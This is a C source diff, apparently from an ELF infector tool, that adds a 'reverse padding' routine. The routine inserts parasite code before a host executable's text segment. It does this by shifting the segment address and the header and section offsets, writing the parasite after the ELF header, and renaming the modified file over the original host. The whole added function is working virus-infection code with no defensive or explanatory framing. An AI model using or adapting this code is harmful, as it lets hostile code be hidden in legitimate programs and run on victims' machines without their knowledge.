@@ -264,3 +264,86 @@ uint64_t textpadding_inject_64(Elfit_t *host, Elfit_t *parasite, uint64_t patch_
 
     return text_begin + entry_offset; 
 }
+
+/* REVERSE PADDING - AKA PRE-TEXT PADDING */
+
+uint64_t reverse_inject_64(Elfit_t *host, Elfit_t *parasite)
+{
+    Elf64_Ehdr *ehdr;
+    Elf64_Phdr *phdr;
+    Elf64_Shdr *shdr;
+    Elf64_Addr textaddr;
+    size_t psize;
+    int ppages;
+    int ofd;
+    int wrote;
+    int i;
+
+    psize = parasite->file->st_size;
+    ppages = psize / PAGE_SIZE;
+    ppages += psize - (ppages * PAGE_SIZE) ? 1 : 0;
+
+    ehdr = (Elf64_Ehdr *) host->mem;
+    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);
+
+    /* Find the text segment */
+    for (i=0;i<ehdr->e_phnum;i++, phdr++)
+    {
+        if ((phdr->p_type==PT_LOAD) && (phdr->p_flags == (PF_R | PF_X)))
+        {
+            phdr->p_vaddr -= ppages * PAGE_SIZE;
+            phdr->p_filesz = phdr->p_memsz += ppages * PAGE_SIZE;
+            textaddr = phdr->p_vaddr;
+        } else {
+            phdr->p_offset += (ppages * PAGE_SIZE);
+        }
+    }
+
+    /* modify section headers */
+
+    shdr = (Elf64_Shdr *) (host->mem + ehdr->e_shoff);
+    for (i=0;i<ehdr->e_shnum;i++, shdr++)
+    {
+        shdr->sh_offset += (ppages * PAGE_SIZE);
+    }
+
+    /* modify ehdr to reflect new offsets */
+    ehdr->e_phoff += (ppages * PAGE_SIZE);
+    ehdr->e_shoff += (ppages * PAGE_SIZE);
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
+    {
+        perror("new host");
+        exit(1);
+    }
+
+    /* write ELF header */
+    if ((wrote = write(ofd, host->mem, sizeof(Elf64_Ehdr))) != sizeof(Elf64_Ehdr))
+    {
+        perror("writing elfheader");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
+    {
+        perror("writing parasite");
+        exit(1);
+    }
+
+    if (lseek(ofd, (ppages * PAGE_SIZE) - psize, SEEK_CUR) == -1)
+    {
+        perror("lseek");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, host->mem + sizeof(Elf64_Ehdr), (host->file->st_size - sizeof(Elf64_Ehdr)))) != (host->file->st_size - sizeof(Elf64_Ehdr)))
+    {
+        perror("write rest of host");
+        exit(1);
+    }
+
+    rename(TMP, host->name);
+    close(ofd);
+
+    return textaddr + sizeof(Elf64_Ehdr);
+}
